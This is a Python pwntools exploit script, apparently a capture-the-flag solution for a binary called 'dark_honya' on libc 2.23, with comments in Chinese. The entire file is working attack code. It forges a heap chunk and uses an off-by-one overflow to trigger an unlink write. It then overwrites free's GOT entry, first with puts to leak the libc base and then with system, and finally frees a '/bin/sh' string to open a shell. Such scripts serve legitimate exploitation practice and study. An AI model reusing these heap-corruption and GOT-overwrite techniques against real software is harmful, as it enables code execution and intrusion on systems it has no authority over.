# libc 2.23
# encoding: utf-8

from pwn import *

context.arch = 'amd64'
libc = ELF("./libc.so.6")

def setname(name):
	r.sendafter('name', name)

def buy(name):
	r.sendlineafter('!', '1')
	r.sendafter('book?', name)

def free(idx):
	r.sendlineafter('!', '2')
	r.sendlineafter('return?', str(idx))

def write(idx, content):
	r.sendlineafter('!', '3')
	r.sendline(str(idx))
	r.sendafter('book?', content)


g_name = 0x6020a0
g_book = 0x6021a0
free_got = 0x602018
puts_got = 0x602020
puts_plt = 0x400660

r = process('./dark_honya')

# 建立 fake chunk 大小屬於 unsorted bin
setname(flat(0, 0x91)+'\x00'*0x80+flat(0, 0x21, 0, 0, 0, 0x21))


for i in range(5):
	buy(str(i))


free(3)

# 先利用 buy 的 off-by-one 蓋掉 chunk4 的 prev_inuse bit, 之後 free chunk 4 就會觸發 merge
# 再用 merge 觸發 unlink, 將 g_book+0x18 寫入 g_book 的位址
buy(flat(0, 0xf1, g_book+0x18-0x18, g_book+0x18-0x10).ljust(0xf0, '\x00')+p64(0xf0))
free(4)

# 修改 free_got 為 puts_plt , leak libc base
write(3, flat(free_got, g_name+0x10))
free(1)

write(0, p64(puts_plt)[:-1])
write(3, flat(g_name+0x10))
free(0)


libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2)-0x3c4b78
print "libc_base @ ", hex(libc_base)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)

# 修改 free got 為 system 並觸發 system('/bin/sh')
write(3, flat(free_got, g_name+0x10))
write(1, "/bin/sh")
write(0, p64(system)[:-1])
free(1)

r.interactive()
